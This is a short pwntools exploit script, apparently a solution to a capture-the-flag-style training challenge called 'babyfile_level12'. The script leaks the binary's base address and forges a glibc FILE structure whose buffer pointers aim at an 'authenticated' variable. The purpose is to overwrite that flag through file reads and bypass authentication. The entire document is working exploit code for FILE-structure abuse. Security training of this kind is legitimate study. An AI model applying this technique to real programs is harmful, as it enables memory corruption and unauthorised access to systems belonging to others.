# open_file -> write_fp -> read_file (into *authenticated -> authenticate -> quit)

from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level12")
binary = ELF("/challenge/babyfile_level12")

# binary addr leak
p.recvuntil(b"[LEAK]")
p.recvuntil(b"located at: ")
main_leak = int(p.recvuntil(b'\n')[:-1], 16)
binary_base = main_leak - binary.sym['main']
print("binary base = {}".format(binary_base))

authenticated = binary_base + binary.sym['authenticated']

# open_file
p.sendline(b"open_file")
print(p.recv())

# new_note
p.sendline(b"new_note")
p.sendline(b"0")
p.sendline(b"24")
print(p.recv())

# write_fp
fs = FileStructure()
#fs.fileno = 3
fs._IO_buf_base = authenticated
fs._IO_buf_end = authenticated + 0x28
payload = bytes(fs)[:0x70]
#payload = fs.read(authenticated, 8)
p.sendline(b"write_fp")
p.send(payload)

# read_file
#print(p.recv())
#p.sendline(b"read_file")

p.interactive()
